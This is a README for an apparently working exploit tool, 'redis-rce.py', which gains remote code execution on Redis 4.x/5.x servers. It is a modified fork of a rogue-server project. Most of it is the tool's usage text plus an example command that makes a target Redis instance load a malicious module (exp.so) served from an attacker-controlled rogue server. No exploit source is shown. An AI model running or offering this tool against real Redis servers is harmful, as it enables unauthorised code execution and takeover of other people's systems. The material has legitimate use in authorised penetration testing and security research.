# Redis RCE

A exploit for Redis 4.x/5.x RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

This repo is a modified version of <https://github.com/n0b0dyCN/redis-rogue-server> .
## Usage:

```
usage: redis-rce.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-f FILE]
                    [-a AUTH] [-v]

Redis 4.x/5.x RCE with RedisModules

optional arguments:
  -h, --help            show this help message and exit
  -r RHOST, --rhost RHOST
                        target host
  -p RPORT, --rport RPORT
                        target redis port, default 6379
  -L LHOST, --lhost LHOST
                        rogue server ip
  -P LPORT, --lport LPORT
                        rogue server listen port, default 21000
  -f FILE, --file FILE  RedisModules to load, default exp.so
  -a AUTH, --auth AUTH  redis password
  -v, --verbose         show more info
```

## example:
```
python redis-rce.py -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 1337 -f exp.so
```
![image](https://user-images.githubusercontent.com/55566953/136344910-e2afabce-fa9d-4995-b911-cd2cb3b7dd84.png)


